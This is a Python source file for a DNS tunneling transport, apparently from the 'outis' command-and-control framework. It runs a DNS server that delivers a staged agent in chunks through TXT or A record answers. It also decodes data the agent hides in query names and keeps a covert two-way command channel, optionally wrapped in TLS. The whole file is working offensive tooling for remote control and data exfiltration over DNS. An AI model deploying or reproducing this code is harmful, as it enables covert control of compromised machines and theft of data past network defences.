import socketserver
import binascii
import ssl
import threading
import math
import time
import dns
import dns.message

from syhelpers.dataqueue import DataQueue
from syhelpers.encoding import dnshostdecode, dnstxtencode, lenofb64decoded, dnsip4encode, dnshostencode, dnsip6encode
from syhelpers.files import sanatizefilename
from syhelpers.types import isportnumber, isint
from .transport import Transport
from syhelpers.log import *
from syhelpers.modulebase import ModuleBase

DEBUG_MODULE = "TransportDns"


class TransportDns (Transport, ModuleBase):
    """ allows and handles DNS query based connections """

    COMMAND_NODATA = b"NOD"
    COMMAND_ENDOFCONNECTION = b"EOC"
    COMMAND_PING = b"PIN"
    COMMAND_PONG = b"PON"

    # noinspection PyMissingConstructor
    def __init__(self, handler):
        """
        initializese the module
        :param handler: backreference to outis handler object
        """

        self.options = {
            'ZONE' : {
                'Description'   :   'DNS Zone for handling requests',
                'Required'      :   True,
                'Value'         :   None
            },
            'LHOST': {
                'Description'   :   'Interface IP to listen on',
                'Required'      :   True,
                'Value'         :   "0.0.0.0"
            },
            'LPORT' : {
                'Description'   :   'UDP-Port to listen on for DNS server',
                'Required'      :   True,
                'Value'         :   "53"
            },
            'DNSTYPE': {
                'Description'   :   'DNS type to use for the connection (stager only, the agent will enumerate all ' +
                                    'supported types on its own)',
                'Required'      :   True,
                'Value'         :   "TXT",
                'Options'       :   ("TXT", "A")
            },
            'DNSSERVER': {
                'Description'   :   'IP address of DNS server to connect for all queries',
                'Required'      :   False,
                'Value'         :   None
            },
        }
        self.handler = handler
        self.conn = None
        self.server = None
        self.staged = False
        self.currentstagenum = 0
        self.currentnum = -1
        self.senddataqueue = DataQueue()
        self.recvdataqueue = DataQueue()
        self.progress = None
        self.maxstagenum = None
        self.laststagepart = None
        self.lastpart = None

    def setoption(self, name, value):
        """
        Sets an option
        :param name: name of the option
        :param value: new value
        :return: True iff the value was found, not necessary set!
        """

        # TODO: check interface ip and DNSSERVER

        if name.upper() == "ZONE" and not(self._validate_zone("ZONE", value)):
            return True  # value found, but not set

        if name.upper() == "LPORT" and not(self._validate_port("LPORT", value)):
            return True  # value found, but not set
        elif isint(value) and int(value) != 53:
            print_error("DNS might not work if you set a non-default port. We will assume, " +
                        "you know what you do and continue.")
            # and continue setting it

        return ModuleBase.setoption(self, name, value)

    @staticmethod
    def _validate_zone(name, zone):
        """
        validates whether DNS zone is plausible
        :param name: name of the option field, used for outputs
        :param zone: string of the DNS zone to validate
        :return: True iff we could validate the zone
        """

        # TODO: check zone

        if not zone or not str(zone):
            print_error(str(name)+" is invalid")
            return False
        else:
            return True

    @staticmethod
    def _validate_port(name, port):
        """
        checks whether the port value is plausible
        :param name: name of the option, to use in messages
        :param port: port number to check
        :return: True iff plausible
        """

        if not isportnumber(port):
            print_error(str(name)+" is invalid, should be 1 <= port <= 65535")
            return False
        else:
            return True

    def validate_options(self):
        """
        Validate all currently set listener options.
        """

        valid = ModuleBase.validate_options(self)

        # TODO: check interface ip LHOST and DNSSERVER

        port = self.options['LPORT']['Value']
        if port and not(self._validate_port('LPORT', port)):
            valid = False

        zone = self.options['ZONE']['Value']
        if zone and not(self._validate_zone('ZONE', port)):
            valid = False

        return valid

    def open(self, staged=False):
        """
        open the DNS server and listen for connections
        :param staged: should we stage first?
        :return: True if successfull
        """

        if not self.validate_options():
            return False

        # reset all internal values
        self.conn = None
        self.server = None
        self.staged = staged
        self.currentstagenum = 0
        self.currentnum = -1
        self.senddataqueue = DataQueue()
        self.recvdataqueue = DataQueue()
        self.progress = None
        self.maxstagenum = None
        self.laststagepart = None
        self.lastpart = None

        if not staged:
            self.currentstagenum = -1
        else:
            self.currentstagenum = 0

        # mark backchannel to us from each DnsHandler instance
        DnsHandler.transport = self

        lparams = (self.options['LHOST']['Value'], int(self.options['LPORT']['Value']))

        try:
            self.server = socketserver.UDPServer(lparams, DnsHandler)
        except PermissionError as e:
            print_error("Could not open DNS server on {}:{}: {}".format(lparams[0], lparams[1],
                                                                        str(e)))
            return False

        threading.Thread(target=self.server.serve_forever).start()

        print_message("DNS listening on {}:{}".format(lparams[0], lparams[1]))
        return True

    def send(self, data):
        """
        send data to the connected host
        :param data: data to send
        :return: None
        """

        if not self.server:
            print_error("Connection not open")
            return

        # if wrapped by a TLS connection, just write into that one
        if self.conn:
            self.conn.write(data)

        # else, add the data to the send queue normally
        else:
            self.senddataqueue.write(data)

        # block until send
        while self.senddataqueue.has_data():
            pass

    def receive(self, leng=1024):
        """
        receive data from connected host
        :param leng: length of data to collect
        :return: data
        """

        if not self.server:
            print_error("Connection not open")
            return

        data = None

        # if wrapped by a TLS connection, read from there
        if self.conn:
            while data is None:
                # if there is no data in either queue, block until there is
                while self.conn.pending() <= 0 and not self.recvdataqueue.has_data():
                    time.sleep(0.1)
                print_debug(DEBUG_MODULE, "conn.pending = {}, recvdataqueue = {}"
                            .format(self.conn.pending(), self.recvdataqueue.length()))

                try:
                    data = self.conn.read(leng)
                    break
                except (ssl.SSLWantReadError, ssl.SSLSyscallError):
                    pass

        # else, read from the dataqueue normally
        else:
            # if there is no data, block until there is
            while not self.recvdataqueue.has_data():
                pass
            data = self.recvdataqueue.read(leng)

        # finish even if less data than requested, higher level must handle this
        return data

    def has_data(self):
        """
        returns True if the connection has data
        :return: True iff the connection has data that can be read
        """

        if not self.server:
            print_error("Connection not open")
            return

        if self.conn:
            return self.conn.pending() > 0 or self.recvdataqueue.has_data()
        else:
            return self.recvdataqueue.has_data()

    def upgradefromstager(self):
        """
        upgrade the connection from staged form to unstaged real connection
        :return: None
        """

        # server stays open, we just accept no staging anymore
        self.staged = False
        self.lastpart = None
        self.currentnum = -1

    def upgradetotls(self):
        """
        upgrade to a tls wrapped connection
        :return: None
        """

        # TODO: newer TLS version?
        # noinspection PyUnresolvedReferences
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        # TODO: PLATFORM STAGECERTIFICATEFILE is not the correct name for this value, move to handler or set a different
        #   variable in TRANSPORT with the same initial value?
        certkeyfile = sanatizefilename(self.handler.platform.options['STAGECERTIFICATEFILE']['Value'])
        context.load_cert_chain(certfile=certkeyfile, keyfile=certkeyfile)
        self.conn = context.wrap_bio(self.recvdataqueue.memorybio, self.senddataqueue.memorybio, server_side=True)
        print_message("Waiting for connection and TLS handshake...")
        while True:
            try:
                self.conn.do_handshake()
                break
            except (ssl.SSLWantReadError, ssl.SSLSyscallError):
                pass
        print_message("Upgrade to TLS done")

    def close(self):
        """
        Close the connection
        :return: None
        """

        if self.server is None:
            print_debug(DEBUG_MODULE, "Connection not open")
            return

        self.server.shutdown()
        self.server.server_close()
        self.server = None

    def serve_stage(self, stagepartnum, maxresplen):
        """
        should serve the next part of the staged agent, if the number matches
        :param stagepartnum: number of the stager part to get
        :param maxresplen: maximal response lenght according to the DNS type used for encoding
        :return: part of the staged agent or None
        """

        if self.currentstagenum - 1 == stagepartnum and self.laststagepart:
            return self.laststagepart

        if not self.staged:
            if self.handler.platform.options["STAGED"]["Value"] == "TRUE":  # staging ended recently
                print_debug(DEBUG_MODULE, "request for stage part {}, but not staging anymore, ignoring"
                            .format(stagepartnum))
            else:
                print_error("stager request for TransportDns but its not staged, dropping")
            return None

        if self.currentstagenum != stagepartnum:
            print_debug(DEBUG_MODULE, "request for different stager part number, expected: {}, received: {}".format(
                self.currentstagenum, stagepartnum))
            return None  # do not answer more than once

        if not self.senddataqueue.has_data():
            print_debug(DEBUG_MODULE, "out of stager data to send")
            return None  # end of data to send / stager code

        if self.maxstagenum is None:
            self.maxstagenum = math.ceil(self.senddataqueue.length() / maxresplen) - 1

        # create progress bar if selected
        if self.progress is None and self.handler.options['PROGRESSBAR']['Value'] == "TRUE" \
                and not isactivated(DEBUG_MODULE):
            import progressbar
            self.progress = progressbar.ProgressBar(0, self.maxstagenum)

        # print progress either in debug line or as progressbar (if selected)
        if isactivated(DEBUG_MODULE):
            print_debug(DEBUG_MODULE, "Sending staged agent part {} of {}".format(self.currentstagenum,
                                                                                  self.maxstagenum))
        elif self.progress is not None:
            self.progress.update(self.currentstagenum)
            if self.currentstagenum == self.maxstagenum:
                self.progress.finish()  # flush the line with the progressbar

        # return next data segment and increase segment counter
        nextdata = self.senddataqueue.read(maxresplen)
        self.currentstagenum += 1
        self.laststagepart = nextdata
        return nextdata

    def serve_main(self, requestnum, indata, minresplen, maxresplen):
        """
        serves a usual data response which will be encoded into a matching DNS type
        :param requestnum: number of the request, to distinguish new from old requests
        :param indata: byte data that the agent send to us
        :param minresplen: minimal response lenght according to the DNS type used for encoding (often 0)
        :param maxresplen: maximal response lenght according to the DNS type used for encoding
        :return: byte data we want to send to the agent
        """

        if self.currentnum == -1:
            print_message("Initial connection with new agent started")
            self.currentnum = requestnum
            # TODO: what happens on a overflow of the requestnum???

        if self.currentnum - 1 == requestnum and self.lastpart:
            return self.lastpart

        if self.currentnum != requestnum:
            print_debug(DEBUG_MODULE, "request with different request number, expected: {}, received: {}".format(
                self.currentnum, requestnum))
            return None  # do not answer to not provoke inconsistancies

        datatosend = None
        dataiscommand = False

        commandflag, indata = TransportDns._decode_indata(indata)

        if commandflag:
            if indata == TransportDns.COMMAND_PING:
                datatosend = TransportDns.COMMAND_PONG
                dataiscommand = True
            elif indata == TransportDns.COMMAND_PONG:
                print_message("pong from agent received")
                pass  # and answer normally
            elif indata == TransportDns.COMMAND_ENDOFCONNECTION:
                datatosend = TransportDns.COMMAND_ENDOFCONNECTION
                dataiscommand = True
                print_error("DNS agent ended connection")
                # TODO: close our part of the connection
            elif indata == TransportDns.COMMAND_NODATA:
                pass  # do not add any data to recvdataqueue but answer normally
        else:
            self.recvdataqueue.write(indata)

        # TODO: implement end of connection and ping here aswell

        # if no command to send, send the next sendqueue content
        if not datatosend:
            datatosend = self.senddataqueue.read(maxresplen-1)  # 1 byte is needed for commands

        # if still nothing, send an empty response
        if not datatosend:
            datatosend = TransportDns.COMMAND_NODATA
            dataiscommand = True

        if datatosend:
            if len(datatosend)+1 < minresplen:
                datatosend = TransportDns._encode_outdata(dataiscommand, datatosend,
                                                          paddingbytes=minresplen-len(datatosend)-1)
            else:
                datatosend = TransportDns._encode_outdata(dataiscommand, datatosend)

        self.currentnum += 1
        self.lastpart = datatosend
        return datatosend

    @staticmethod
    def _decode_indata(indata):
        """
        decodes incoming data
        :param indata: byte data from the agent
        :return: (commandflag, decoded byte data)
        """

        if indata[0] == ord('C'):
            commandflag = True
        elif indata[0] == ord('D'):
            commandflag = False
        else:
            print_error("received invalid commandbyte: "+str(indata[0]))
            return None

        resdata = indata[1:]
        return commandflag, resdata

    @staticmethod
    def _encode_outdata(commandflag, outdata, paddingbytes=0):
        """
        encodes outgoing data
        :param commandflag: is it a command?
        :param outdata: byte data to encode
        :param paddingbytes: if padding is needed, encode the number of padding bytes (1-15) into the commandbyte (only
        if commandflag is False) and fill output data with padding (always)
        :return: encoded outdata
        """

        if paddingbytes < 0 or paddingbytes > 15:
            print_error("invalid paddingbyte number, should be between 0 and 15")
            return None

        if commandflag:
            outdata = b'C' + outdata + b'X' * paddingbytes
        else:
            paddingnum = ord('D') + paddingbytes
            outdata = bytes(chr(paddingnum), 'utf-8') + outdata + b'X' * paddingbytes

        return outdata


class DnsHandler(socketserver.BaseRequestHandler):
    """
    This class is instanciated once per connection and should handle the DNS requests
    """

    # the transport object above, that initiated this
    transport = None

    def __init__(self, request, client_address, server):
        """
        initiate a new DNS handler for a request
        """

        self.zone = self.transport.options["ZONE"]["Value"].rstrip(".")
        self.stagerrequest = False
        self.dnstype = None

        print_debug(DEBUG_MODULE, "zone = " + str(self.zone))
        super().__init__(request, client_address, server)

    def _is_in_zone(self, queryname):
        """
        tests whether the domain name queried is part of our zone
        :param queryname: domain name queried
        :return: True iff it is in our zone
        """

        return str(queryname).rstrip(".").endswith(self.zone)

    def _decode_query(self, queryname):
        """
        decodes the query content according to our specification
        :param queryname: domain name queried
        :return: decoded query string or None if decoding failed
        """

        # strip zone and remove all dots
        q = str(queryname).rstrip(".").rstrip(self.zone).replace(".", "")

        # remove random part (used to avoid DNS caching issues)
        q2, r = q.rsplit("r", maxsplit=1)
        if not r or not isint(r):
            q2, r = q.rsplit("R", maxsplit=1)
            if not r or not isint(r):
                print_error("stripping the random part from DNS query failed, ignoring this query")
                return None
        q = q2

        #print_debug(DEBUG_MODULE, "q = {}, q.startswith('s') = {}, q.strip('s').isdigit() = {}".format(
        #    q, q.startswith('s'), q.strip('s').isdigit()))

        if q.startswith("s") and q.strip("s").isdigit():  # stager request
            self.stagerrequest = True
            return int(q.strip("s")), b''  # we will not decode it further
        elif q.startswith("S") and q.strip("S").isdigit():
            self.stagerrequest = True
            return int(q.strip("S")), b''

        # otherwise we expect a fully enrolled agent on the other side and decode
        try:
            return int(r), dnshostdecode(q)
        except binascii.Error:
            return None

    def _encode_response(self, rdata):
        """
        encodes the response data to a form we can include in a DNS response of the given type
        :param rdata: data to include
        :return: encoded data
        """

        dnstype = self._dns_type()

        if dnstype is dns.rdatatype.TXT:
            return dnstxtencode(rdata)
        elif dnstype is dns.rdatatype.A:
            return dnsip4encode(rdata)
        elif dnstype is dns.rdatatype.CNAME:
            return dnshostencode(rdata, self.zone)
        elif dnstype is dns.rdatatype.MX:
            return b'10 ' + dnshostencode(rdata, self.zone)
        elif dnstype is dns.rdatatype.AAAA:
            return dnsip6encode(rdata)
        else:
            print_error("invalid DNSTYPE for encoding requested: {}".format(dnstype))
            return None

    def _get_response(self, requestnum, qtext):
        """
        finds the response for the given query text
        :param requestnum: number of the request
        :param qtext: query to respond to (already decoded)
        :return: response (not yet encoded)
        """

        minresplen = self._get_minimal_response_length_for_type()
        maxresplen = self._get_maximal_response_length_for_type()

        if self.stagerrequest:  # stager request
            return self.transport.serve_stage(requestnum, maxresplen=maxresplen)

        return self.transport.serve_main(requestnum, qtext, minresplen=minresplen, maxresplen=maxresplen)

    def _get_minimal_response_length_for_type(self):
        """
        returns the minimal possible byte length for this dns type to use in a single response
        :return: length
        """

        dnstype = self._dns_type()

        if dnstype is dns.rdatatype.TXT:
            return 1
        elif dnstype is dns.rdatatype.A:
            return 4  # 4 bytes per IPv4 address, this is ok
        elif dnstype is dns.rdatatype.CNAME or dnstype is dns.rdatatype.MX:
            return 1
        elif dnstype is dns.rdatatype.AAAA:
            return 16  # 16 bytes per IPv6 address
        else:
            print_error("invalid DNSTYPE for encoding requested: {}".format(dnstype))
            return None

    def _get_maximal_response_length_for_type(self):
        """
        returns the maximal possible byte length for this dns type to use in a single response
        :return: length
        """

        dnstype = self._dns_type()

        if dnstype is dns.rdatatype.TXT:
            return lenofb64decoded(250)  # TODO: or maybe more, what does the standard say?
        elif dnstype is dns.rdatatype.A:
            return 4  # 4 bytes per IPv4 address, this is ok
        elif dnstype is dns.rdatatype.CNAME or dnstype is dns.rdatatype.MX:
            return 100  # 250 bytes in total, using hexencoding 100 = 200 bytes in the hostname, which leaves a
            # safe 50 for the zone and further additions
        elif dnstype is dns.rdatatype.AAAA:
            return 16  # 16 bytes per IPv6 address
        else:
            print_error("invalid DNSTYPE for encoding requested: {}".format(dnstype))
            return None

    def _dns_type(self):
        """
        Should return the DNS response data type needed, TXT or A for stager or anything we support else
        :return: dns.rdatatype.TXT or dns.rdatatype.A or other
        """

        if self.stagerrequest:
            if self.transport.options['DNSTYPE']['Value'] == "TXT":
                return dns.rdatatype.TXT
            elif self.transport.options['DNSTYPE']['Value'] == "A":
                return dns.rdatatype.A
            else:
                print_error("invalid DNSTYPE")
                return None

        # if not staging, we can be more creative
        else:
            return self.dnstype

    def handle(self):
        """
        handles a single DNS request and sends a response
        :return: None
        """

        data = self.request[0]
        socket = self.request[1]

        try:
            msg = dns.message.from_wire(data)
        except Exception as e:
            print_error("invalid DNS message ({}): {}".format(str(e), data))
            return

        if msg.opcode() != 0:  # not a query
            print_error("invalid DNS request received: "+str(msg))
            return

        for q in msg.question:
            print_debug(DEBUG_MODULE, "query from {}: {}".format(self.client_address[0], str(q)))

            if "IN PTR" in str(q):
                self.dnstype = dns.rdatatype.PTR
                qtext = str(q.name)
                requestnum = -1

            elif not self._is_in_zone(q.name):
                self.dnstype = None
                print_error("ignoring query outsite of our zone: " + str(q))
                continue

            else:
                requestnum, qtext = self._decode_query(q.name)
                if qtext is None:
                    print_error("decoding failed for query: " + str(q))
                    continue
                print_debug(DEBUG_MODULE, "requestnum = {}, decoded qtext = {}".format(requestnum, qtext))

                if "IN TXT" in str(q):
                    self.dnstype = dns.rdatatype.TXT
                elif "IN MX" in str(q):
                    self.dnstype = dns.rdatatype.MX
                elif "IN CNAME" in str(q):
                    self.dnstype = dns.rdatatype.CNAME
                elif "IN AAAA" in str(q):
                    self.dnstype = dns.rdatatype.AAAA
                elif "IN A" in str(q):
                    self.dnstype = dns.rdatatype.A
                else:
                    self.dnstype = None

            resp = dns.message.make_response(msg)
            resp.flags |= dns.flags.AA
            resp.set_rcode(0)
            if resp:
                if self.dnstype is not dns.rdatatype.PTR:
                    data = self._get_response(requestnum, qtext)
                    if data:
                        data = self._encode_response(data)
                        if data:
                            print_debug(DEBUG_MODULE, "responding with: {}".format(str(data, 'utf-8')))
                            resp.answer.append(dns.rrset.from_text(q.name, 7600, dns.rdataclass.IN, self._dns_type(),
                                                               str(data, 'utf-8')))
                            socket.sendto(resp.to_wire(), self.client_address)
                        else:
                            print_debug(DEBUG_MODULE, "no data to respond after encoding, ignoring query")
                    else:
                        print_debug(DEBUG_MODULE, "no data to respond, ignoring query")
                else:
                    data = self.zone + '.'  # absolute name, dot is needed here!
                    print_debug(DEBUG_MODULE, "responding to PTR query with zone: {}".format(data))
                    resp.answer.append(dns.rrset.from_text(q.name, 7600, dns.rdataclass.IN, dns.rdatatype.PTR, data))
                    socket.sendto(resp.to_wire(), self.client_address)
            else:
                print_error("error creating response for DNS query: " + msg)
                return
